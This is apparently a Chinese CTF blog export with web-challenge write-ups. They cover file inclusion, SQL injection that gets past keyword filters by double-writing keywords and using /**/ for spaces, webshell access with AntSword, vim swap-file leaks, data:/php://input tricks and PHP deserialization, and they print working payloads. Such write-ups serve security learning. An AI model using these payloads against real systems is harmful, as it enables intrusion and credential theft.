<p><img src="/2020/03/09/CG-CTF-WEB/43.png" alt="43"></p>
<p>提示“只有用本公司开发的的浏览器”，猜想可能用到<code>user-agent</code>，但是我们并不知道到底是什么浏览器，所以继续往下看。</p>
<p>接下来看留言，猜想此处可能存在<code>xss</code>或<code>sql</code>注入，先随便输入试试。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/44.png" alt="44"></p>
<p>出题人说自己也不会<code>xss</code>，所以排除xss。</p>
<p>确认提交后，提示页码源代码中有惊喜！</p>
<p>我们用<code>view-source</code>查看网页源码，在第58行，发现<code>&quot;./about.php?file=sm.txt&quot;</code>。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/45.png" alt="45"></p>
<p>点开后，我们可以看到<code>sm.txt</code>文件的内容，很明显，此题存在<code>文件包含</code>漏洞。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/46.png" alt="46"></p>
<p><code>sm.txt</code>文件中给出了两个提示：</p>
<ul>
<li>一个是<code>admin表结构 create table admin ( id integer, username text, userpass text, )</code>这更加坚定了存在SQL注入。然后也没有什么有用的信息了。</li>
<li>另一个是许多文件： config.php，index.php，passencode.php，say.php，不要忘了还有about.php。</li>
</ul>
<p>再次返回留言板，最底部还有一个<code>本CMS说明</code>可以打开。还是<code>sm.txt</code></p>
<p>现在我们可以利用文件包含漏洞读取上面找出的文件，先查看<code>index.php</code>。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/47.png" alt="47"></p>
<p>这样的代码可读性很差，我们可以利用<code>python</code>中的<code>BeautifulSoup</code>库来整理代码。编写脚本：</p>
<pre><code>import requests
from bs4 import BeautifulSoup

url = &quot;http://cms.nuptzj.cn/about.php?file=&quot;
file_list = [&quot;index.php&quot;,&quot;passencode.php&quot;,&quot;config.php&quot;,&quot;say.php&quot;,&quot;so.php&quot;&quot;about.php&quot;]

for i in file_list:
    r = requests.get(url+i)
    print(&quot;download&quot;+i)
    if r.status_code==200:
        r.encoding = &quot;utf-8&quot;
    r = BeautifulSoup(r.text,&quot;html.parser&quot;)
    print(r)</code></pre><p>关于<code>BeautifulSoup库</code>的使用可以参考我的另一篇blog–<code>Python-requests 模块学习</code>的相关连接。</p>
<p>先看index.php:</p>
<pre><code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;?php
$file=$_GET[&apos;file&apos;];
if($file==&quot;&quot; || strstr($file,&apos;config.php&apos;)){
    echo &quot;file参数不能为空！&quot;;
    exit();
}else{
    $cut=strchr($file,&quot;loginxlcteam&quot;);
    if($cut==false){
    $data=file_get_contents($file);
    $date=htmlspecialchars($data);
    echo $date;
    }else{
        echo &quot;&lt;script&gt;alert(&apos;敏感目录，禁止查看！但是。。。&apos;)&lt;/script&gt;&quot;;
    }
}</code></pre><p>发现<code>config.php</code>和<code>loginxlcteam</code>。我们看看这个<code>loginxlcteam</code>是什么。</p>
<p>发现Xlcteam留言板系统后台登录。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/48.png" alt="48"></p>
<p>不出意外，应该就是在这里SQL注入，但是条件还没有成熟。</p>
<p>此时想到之前<code>so.php</code>中提到只有本公司开发的浏览器才能用。我们来查看<code>so.php</code>中的内容。</p>
<pre><code>&lt;?php
if($_SERVER[&apos;HTTP_USER_AGENT&apos;]!=&quot;Xlcteam Browser&quot;){
echo &apos;万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~&apos;;
    exit();
}
$id=$_POST[&apos;soid&apos;];
include &apos;config.php&apos;;
include &apos;antiinject.php&apos;;
include &apos;antixss.php&apos;;
$id=antiinject($id);
$con = mysql_connect($db_address,$db_user,$db_pass) or die(&quot;不能连接到数据库！！&quot;.mysql_error());
mysql_select_db($db_name,$con);
$id=mysql_real_escape_string($id);
$result=mysql_query(&quot;SELECT * FROM `message` WHERE display=1 AND id=$id&quot;);
$rs=mysql_fetch_array($result);
echo htmlspecialchars($rs[&apos;nice&apos;]).&apos;:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&apos;.antixss($rs[&apos;say&apos;]).&apos;&lt;br /&gt;&apos;;
mysql_free_result($result);
mysql_free_result($file);
mysql_close($con);
?&gt;</code></pre><h5 id="！这里才是SQL注入的地方"><a href="#！这里才是SQL注入的地方" class="headerlink" title="！这里才是SQL注入的地方"></a>！这里才是SQL注入的地方</h5><p>第2行代码，推出当<code>$_SERVER[&#39;HTTP_USER_AGENT&#39;]==&quot;Xlcteam Browser&quot;</code>才可以通过。接着往下看，第8行有防止SQL注入的<code>antiinject.php</code>文件。</p>
<p>查看<code>antiinject.php</code>文件。</p>
<pre><code>&lt;?php
function antiinject($content) {
    $keyword = array(&quot;select&quot;, &quot;union&quot;, &quot;and&quot;, &quot;from&quot;, &apos; &apos;, &quot;&apos;&quot;, &quot;;&quot;, &apos;&quot;&apos;, &quot;char&quot;, &quot;or&quot;, &quot;count&quot;, &quot;master&quot;, &quot;name&quot;, &quot;pass&quot;, &quot;admin&quot;, &quot;+&quot;, &quot;-&quot;, &quot;order&quot;, &quot;=&quot;);
    $info = strtolower($content);
    for ($i = 0;$i &lt;= count($keyword);$i++) {
        $info = str_replace($keyword[$i], &apos;&apos;, $info);
    }
    return $info;
}
?&gt;</code></pre><p>发现了文件中过滤了很多关键字。我们可以通过双写绕过或者<code>=</code>绕过，空格可以用<code>/**/</code>绕过。</p>
<h5 id="开始SQL注入"><a href="#开始SQL注入" class="headerlink" title="开始SQL注入"></a>开始SQL注入</h5><ul>
<li>首先注意在header中将<code>User-Agent</code>设置为<code>Xlcteam Browser</code>。</li>
<li>先找出有效的注入字段，payload：<code>soid=0/**/an=d/**/1/**/uni=on/**/sele=ct/**/1,2,3,4</code>，回显2和3，说明2，3处可以注入。</li>
<li>之前我们已经知道了admin表的结果，所以直接注入。payload：<code>soid=0/**/an=d/**/1/**/uni=on/**/sele=ct/**/1,2,(sele=ct/**/group_concat(userp=ass)/**/fr=om/**/adm=in),4</code>。</li>
<li>回显<code>102 117 99 107 114 117 110 116 117</code>，这是userpass的ASCII编码，解码得<code>fuckruntu</code>。</li>
<li>我们去后台登录。</li>
</ul>
<p><img src="/2020/03/09/CG-CTF-WEB/49.png" alt="49"></p>
<p>接下来考察一句话木马，提供了文件名，查看文件。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/50.png" alt="50"></p>
<p>直接使用蚁剑：</p>
<pre><code>url : http://cms.nuptzj.cn/xlcteam. php?www=preg_replace
pass : wtf</code></pre><p>查看后台文件，即可获得flag。</p>
<h4 id="0x32密码重置2（题目地址：http-nctf-nuptzj-cn-web14-index-php-）"><a href="#0x32密码重置2（题目地址：http-nctf-nuptzj-cn-web14-index-php-）" class="headerlink" title="0x32密码重置2（题目地址：http://nctf.nuptzj.cn/web14/index.php ）"></a>0x32密码重置2（题目地址：<a href="http://nctf.nuptzj.cn/web14/index.php" target="_blank" rel="noopener">http://nctf.nuptzj.cn/web14/index.php</a> ）</h4><pre><code>TIPS:
1.管理员邮箱观察一下就可以找到
2.linux下一般使用vi编辑器，并且异常退出会留下备份文件
3.弱类型bypass</code></pre><p>先了解Linux下的备份文件：</p>
<pre><code>vim的特性，自动备份：

一、vim备份文件

     默认情况下使用Vim编程，在修改文件后系统会自动生成一个带~的备份文件，某些情况下可以对其下载进行查看；

    eg:index.php普遍意义上的首页，输入域名不一定会显示。   它的备份文件则为index.php~

二、vim临时文件

    vim中的swp即swap文件，在编辑文件时产生，它是隐藏文件，如果原文件名是submit，则它的临时文件

 .submit.swp。如果文件正常退出，则此文件自动删除。</code></pre><ul>
<li>需要用post方式传入email和token。</li>
<li>先找email，F12源码中找到管理员邮箱<code>admin@nuptzj.cn</code>。</li>
<li>再找token，在<code>.submit.php.swp</code>文件下发现源码。</li>
</ul>
<p><img src="/2020/03/09/CG-CTF-WEB/35.png" alt="35"></p>
<ul>
<li>分析源码可知：token必须等于0，长度必须为10，可以推出<code>token=0000000000</code>。</li>
<li>最后传入<code>email</code>和<code>token</code>。</li>
<li>得到<code>flag:nctf{thanks_to_cumt_bxs}</code></li>
</ul>
<p><img src="/2020/03/09/CG-CTF-WEB/36.png" alt="36"></p>
<h4 id="0x33-file-get-contents（题目地址：http-chinalover-sinaapp-com-web23-）"><a href="#0x33-file-get-contents（题目地址：http-chinalover-sinaapp-com-web23-）" class="headerlink" title="0x33 file_get_contents（题目地址：http://chinalover.sinaapp.com/web23/ ）"></a>0x33 file_get_contents（题目地址：<a href="http://chinalover.sinaapp.com/web23/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web23/</a> ）</h4><p>什么都没有，<code>view-soure</code>查看源码。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/37.png" alt="37"></p>
<p>先了解<code>file_get_contents()</code>函数。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/38.png" alt="38"></p>
<p>绕过<code>file_get_contents()</code>函数共有两种方法：<br>一、使用Data URI scheme (data: base64) 协议。</p>
<pre><code> #常用格式有：
 1、 data:,&lt;文本数据&gt;  
 2、 data:text/plain,&lt;文本数据&gt;  
 3、 data:text/html,&lt;HTML代码&gt;  
 4、 data:text/html;base64,&lt;base64编码的5、HTML代码&gt;  
 6、 data:text/css,&lt;CSS代码&gt;  
 7、 data:text/css;base64,&lt;base64编码的CSS代码&gt;  
 8、 data:text/javascript,&lt;Javascript代码&gt;  
 9、 data:text/javascript;base64,&lt;base64编码的Javascript代码&gt;  
10、data:image/gif;base64,base64编码的gif图片数据  
11、data:image/png;base64,base64编码的png图片数据  
12、data:image/jpeg;base64,base64编码的jpeg图片数据  
13、data:image/x-icon;base64,base64编码的icon图片数据</code></pre><p>构造payload：</p>
<pre><code>?file=data:,meizijiu
?file=data:text/plain,meizijiu</code></pre><p>二、二、使用伪协议<code>php://input</code>，再通过<code>POST</code>方法传入<code>&quot;meizijiu&quot;</code></p>
<p>构造payload：</p>
<p><img src="/2020/03/09/CG-CTF-WEB/39.png" alt="39"></p>
<p>得到flag</p>
<p><img src="/2020/03/09/CG-CTF-WEB/40.png" alt="40"></p>
<h4 id="0x34-变量覆盖（题目地址：http-chinalover-sinaapp-com-web24-）"><a href="#0x34-变量覆盖（题目地址：http-chinalover-sinaapp-com-web24-）" class="headerlink" title="0x34 变量覆盖（题目地址：http://chinalover.sinaapp.com/web24/ ）"></a>0x34 变量覆盖（题目地址：<a href="http://chinalover.sinaapp.com/web24/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web24/</a> ）</h4><p>先用<code>view-source</code>查看源码</p>
<p><img src="/2020/03/09/CG-CTF-WEB/41.png" alt="41"></p>
<p>只需要<code>name==&quot;meizijiu233&quot;</code>即可得到flag。</p>
<p>利用<code>$$key=$value</code>，传入<code>name=meizijiu233</code>可以覆盖掉<code>name</code>原来的值，使条件成立。</p>
<p>payload：<code>?name=meizijiu233</code></p>
<p><img src="/2020/03/09/CG-CTF-WEB/42.png" alt="42"></p>
<h4 id="0x35-注意（直接提供flag）"><a href="#0x35-注意（直接提供flag）" class="headerlink" title="0x35 注意（直接提供flag）"></a>0x35 注意（直接提供flag）</h4><hr>
<hr>
<h3 id="写在后面："><a href="#写在后面：" class="headerlink" title="写在后面："></a>写在后面：</h3><pre><code>这些题目只是web入门级别的，接下来就要向更难的题目进发！！！</code></pre>]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CG-CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Cosmos的留言板-1</title>
    <url>/2020/03/09/Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1/</url>
    <content><![CDATA[<h1 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h1><h4 id="题目地址：http-139-199-182-61"><a href="#题目地址：http-139-199-182-61" class="headerlink" title="题目地址：http://139.199.182.61/"></a>题目地址：<a href="http://139.199.182.61/" target="_blank" rel="noopener">http://139.199.182.61/</a></h4><a id="more"></a>

<p>首先，刚进入这个所谓的留言板，注意到URL是<code>http://139.199.182.61/index.php?id=1</code>。</p>
<p><img src="/2020/03/09/Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1/1.png" alt="1missing"></p>
<p>注意到id可以赋值，改成<code>id=2</code>,页面发生了变化。<br>我<strong><strong>*你个大</strong></strong>（bi<del>~</del>）！！！</p>
<p><img src="/2020/03/09/Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1/2.png" alt="2missing"></p>
<p>再改成<code>id=3</code>，又变了一次。</p>
<p>从这儿可以判断<code>id</code>处，可以SQL注入，于是先查找内部的数据库，<code>id=union select database();#</code>,返回<code>id:uniondatabase();</code>,说明select和空格被过滤了。</p>
<p><img src="/2020/03/09/Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1/3.png" alt="3missing"></p>
<p>select过滤可以用<code>seleselectct</code>绕过。</p>
<p>空格绕过有两种方法：</p>
<p>一、通过注释<code>/**/</code>绕过。</p>
<p>二、通过括号<code>(1=0)</code>绕过。</p>
<p>现在爆数据库，构造payload：<code>id=&#39;/**/union/**/seleselectct/**/database();#</code>,发现没有结果</p>
<p>用URL编码payload：<code>id=%27%2f**%2funion%2f**%2fseleselectct%2f**%2fdatabase()%3b%23</code>,提交后返回结果<code>easysql</code>就是此题的数据库。</p>
<p><img src="/2020/03/09/Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1/4.png" alt="4missing"></p>
<p>接下来爆表名，构造payload：<code>id=&#39; union select table_name from information_schema.tables where table_schema=&#39;easysql&#39;;#</code>，对其修饰<code>id=&#39;/**/union/**/seleselectct/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=&#39;easysql&#39;;#</code>，再URL编码payload：<code>%27%2f**%2funion%2f**%2fseleselectct%2f**%2ftable_name%2f**%2ffrom%2f**%2finformation_schema.tables%2f**%2fwhere%2f**%2ftable_schema%3d%27easysql%27%3b%23</code>，返回表名<code>f1aggggggggggggg</code>。</p>
<p><img src="/2020/03/09/Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1/5.png" alt="5missing"></p>
<p>然后爆字段名，构造payload：<code>id=&#39; union select column_name from information_schema.columns where table_name=&#39;f1aggggggggggggg&#39; and table_schema=&#39;easysql&#39;;#</code>，修饰<code>id=&#39;/**/union/**/seleselectct/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=&#39;f1aggggggggggggg&#39;/**/and/**/table_schema=&#39;easysql&#39;;#</code>，URL编码<code>id=%27%2f**%2funion%2f**%2fseleselectct%2f**%2fcolumn_name%2f**%2ffrom%2f**%2finformation_schema.columns%2f**%2fwhere%2f**%2ftable_name%3d%27f1aggggggggggggg%27%2f**%2fand%2f**%2ftable_schema%3d%27easysql%27%3b%23</code>，返回字段名<code>fl4444444g</code>。</p>
<p><img src="/2020/03/09/Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1/6.png" alt="6missing"></p>
<p>最后就可以爆出<code>flag</code>了，构造payload：<code>id=&#39; union select fl4444444g from f1aggggggggggggg;#</code>，修饰<code>id=&#39;/**/union/**/seleselectct/**/fl4444444g/**/from/**/f1aggggggggggggg;#</code>，URL编码<code>id=%27%2f**%2funion%2f**%2fseleselectct%2f**%2ffl4444444g%2f**%2ffrom%2f**%2ff1aggggggggggggg%3b%23</code>，拿到flag：<code>hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}</code>。</p>
<p><img src="/2020/03/09/Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1/7.png" alt="7missing"></p>
<hr>
<hr>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>此题是一道简单的SQL注入题目，首先检测到id处可以进行注入，然后尝试各种注入找出被过滤的关键字，接下来找出绕过过滤的方法，然后根据<code>数据库  --&gt;  表  --&gt;  字段  --&gt;  内容</code>的顺序一步步找出flag！</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF-杂题</tag>
      </tags>
  </entry>
  <entry>
    <title>神盾局的秘密</title>
    <url>/2020/03/09/%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/</url>
    <content><![CDATA[<h1 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h1><h4 id="题目地址：http-web-jarvisoj-com-32768"><a href="#题目地址：http-web-jarvisoj-com-32768" class="headerlink" title="题目地址：http://web.jarvisoj.com:32768"></a>题目地址：<a href="http://web.jarvisoj.com:32768" target="_blank" rel="noopener">http://web.jarvisoj.com:32768</a></h4><a id="more"></a>

<p>首先F12查看源码，发现<code>showimg.php?img=c2hpZWxkLmpwZw==</code></p>
<p>进入Network中打开showimg.php?img=c2hpZWxkLmpwZw==，是一堆乱码，看见showing.php应该是文件包含类的题目。</p>
<p><img src="/2020/03/09/%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/Network.png" alt="Network"></p>
<p>c2hpZWxkLmpwZw==是base64编码，解码后为shield.jpg，所以img查看的内容需要base64加密。</p>
<p>首先先查看showing.php，加密后为c2hvd2luZy5waHA=，payload <code>img=c2hvd2luZy5waHA=</code>，用<code>view-source</code>查看源码。</p>
<p><img src="/2020/03/09/%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/showing.php.png" alt="showing.php"></p>
<p>对$f解码后过滤<code>..</code>，<code>/</code>，<code>\\</code>，<code>pctf</code></p>
<p>接着查看index.php的内容，加密aW5kZXgucGhw，payload <code>img=aW5kZXgucGhw+view-source</code>.</p>
<p><img src="/2020/03/09/%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/index.php.png" alt="index.php"></p>
<p>引入shield.php，有类名<code>Shield</code>,出现反序列化函数<code>unserialize</code>,目前还没有思路。</p>
<p>再看shield.php，加密c2hpZWxkLnBocA==，payload <code>img=c2hpZWxkLnBocA==</code> +<code>view-source</code>.</p>
<p><img src="/2020/03/09/%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/shield.php.png" alt="shield.php"></p>
<p>第一行说flag在<code>pctf.php</code>中，Shield类出现，也过滤了<code>..</code>,<code>/</code>,<code>\\</code>，没有过滤<code>pctf</code></p>
<p>由于前面showing.php中过滤了pctf，所以不能直接查看，所以利用反序列化漏洞。</p>
<p>开始写脚本。</p>
<pre><code>&lt;?php
//flag is in pctf.php
class Shield {
    public $file;
    function __construct($filename = &apos;&apos;) {
        $this -&gt; file = $filename;
    }

    function readfile() {
        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  
        &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {
            return @file_get_contents($this-&gt;file);
        }
    }
}

$ctf = new Shield(&apos;pctf.php&apos;);
echo serialize($ctf);
?&gt;</code></pre><p>得到序列化后的结果<code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code>,构造payload <code>?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code>,F12后看到flag。</p>
<p><img src="/2020/03/09/%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/flag.png" alt="flag"></p>
<hr>
<hr>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>此题是文件包含和反序列化类的题，首先要想到base64加密，之后查看各个php文件，得到线索，想办法查看pctf.php，showing.php都不通，只能在index.php中的序列化上下手。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF-杂题</tag>
      </tags>
  </entry>
</search>
